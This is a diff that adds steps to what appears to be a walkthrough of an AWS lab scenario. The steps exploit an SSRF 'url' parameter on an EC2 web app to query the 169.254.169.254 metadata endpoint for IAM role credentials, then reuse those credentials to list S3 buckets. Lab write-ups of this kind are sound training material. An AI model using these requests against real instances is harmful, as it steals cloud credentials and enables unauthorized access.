@@ -1144,3 +1144,44 @@ aws ec2 describe-instances --profile cg-lambda
 <p align="center">
   <img src="/images/cloud/public_ip_ec2ssrf1.png">
 </p>
+
+* Access the EC2 Instance IP Address via Web Browser.
+
+<p align="center">
+  <img src="/images/cloud/ec2_web.png">
+</p>
+
+* Abuse the SSRF via the "_url_" parameter to hit the EC2 instance metadata by going to.
+
+```bash
+http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+<p align="center">
+  <img src="/images/cloud/ec2_ssrf_web.png">
+</p>
+
+```bash
+http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name>
+```
+
+<p align="center">
+  <img src="/images/cloud/ec2_metadata_web.png">
+</p>
+
+* Add the **ec2-role** Credentials to the AWS profile.
+
+```bash
+aws s3 ls --profile ec2-role
+```
+
+<p align="center">
+  <img src="/images/cloud/ec2_cli_role.png">
+</p>
+
+* Manually add the SessionToken.
+
+<p align="center">
+  <img src="/images/cloud/ec2_role_ssrf.png">
+</p>
+
